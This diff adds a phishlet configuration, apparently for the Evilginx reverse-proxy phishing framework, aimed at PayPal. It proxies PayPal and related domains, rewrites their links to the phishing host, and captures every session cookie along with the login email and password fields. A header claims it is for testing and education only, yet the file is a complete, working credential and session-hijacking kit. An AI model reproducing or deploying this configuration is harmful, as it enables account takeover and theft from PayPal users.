@@ -1,0 +1,63 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+name: 'paypal'
+author: 'Citadel'
+min_ver: '3.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'paypal.com', session: true, is_landing: true, auto_filters: true}
+  - {phish_sub: 'c', orig_sub: 'c', domain: 'paypal.com', session: true, is_landing: false, auto_filters: true}
+  # - {phish_sub: 'pics', orig_sub: 'pics', domain: 'paypal.com', session: true, is_landing: false, auto_filters: true}
+  - {phish_sub: 't', orig_sub: 't', domain: 'paypal.com', session: true, is_landing: false, auto_filters: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filters: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'paypalobjects.com', session: true, is_landing: false, auto_filters: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'recaptcha.net', session: true, is_landing: false, auto_filters: true}
+  - {phish_sub: 'i', orig_sub: 'i', domain: 'paypal.com', session: true, is_landing: false, auto_filters: true}
+  - {phish_sub: 'ddbm2', orig_sub: 'ddbm2', domain: 'paypal.com', session: true, is_landing: false, auto_filters: true}
+  - {phish_sub: 'c6', orig_sub: 'c6', domain: 'paypal.com', session: true, is_landing: false, auto_filters: true}
+  - {phish_sub: 'lhr.stats', orig_sub: 'lhr.stats', domain: 'paypal.com', session: true, is_landing: false, auto_filters: true}
+  - {phish_sub: 'b.stats', orig_sub: 'b.stats', domain: 'paypal.com', session: true, is_landing: false, auto_filters: true}
+
+sub_filters:
+  - {triggers_on: 'www.paypal.com', orig_sub: 'www', domain: 'paypal.com', search: '(https?:\/\/www\.paypal\.com)', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'c.paypal.com', orig_sub: 'c', domain: 'paypal.com', search: '(https?:\/\/c\.paypal\.com)', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 't.paypal.com', orig_sub: 't', domain: 'paypal.com', search: '(https?:\/\/t\.paypal\.com)', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'www', domain: 'gstatic.com', search: '(https?:\/\/www\.gstatic\.com)', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.paypalobjects.com', orig_sub: 'www', domain: 'paypalobjects.com', search: '(https?:\/\/www\.paypalobjects\.com)', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.recaptcha.net', orig_sub: 'www', domain: 'recaptcha.net', search: '(https?:\/\/www\.recaptcha\.net)', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'i.paypal.com', orig_sub: 'i', domain: 'paypal.com', search: '(https?:\/\/i\.paypal\.com)', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'ddbm2.paypal.com', orig_sub: 'ddbm2', domain: 'paypal.com', search: '(https?:\/\/ddbm2\.paypal\.com)', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'c6.paypal.com', orig_sub: 'c6', domain: 'paypal.com', search: '(https?:\/\/c6\.paypal\.com)', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'lhr.stats.paypal.com', orig_sub: 'lhr.stats', domain: 'paypal.com', search: '(https?:\/\/lhr.stats\.paypal\.com)', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'b.stats.paypal.com', orig_sub: 'b.stats', domain: 'paypal.com', search: '(https?:\/\/b.stats\.paypal\.com)', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.paypal.com'
+    # keys: ['enforce_policy', 'cookie_check', 'd_id', 'l7_az', 'ts_c', '_iidt', 'TLTSID', 'TLTDID', 'rssk', 'cookie_prefs', 'fn_dt', 'datadome', 'SEGM', 'kndctr_5CE4123F5245B06C0A490D45_AdobeOrg_identity:regexp', 'KHcl0EuY7AKSMgfvHl7J5E7hPtK:regexp', 'id_token:regexp', 'x-pp-s', 'tsrce', 'ts' ]
+    keys: ['.*,regexp']
+    type: cookie
+  - domain: 'www.paypal.com'
+    # keys: ['nsid', '_dd_s']
+    keys: ['.*,regexp']
+    type: cookie
+
+auth_urls:
+  # - 'https://www.paypal.com/myaccount/summary'
+  - '/myaccount/summary'
+  - '/myaccount/*'
+
+credentials:
+  username:
+    key: 'login_email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'login_password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'www.paypal.com'
+  path: '/signin'
+  # path: '/myaccount/summary'
+
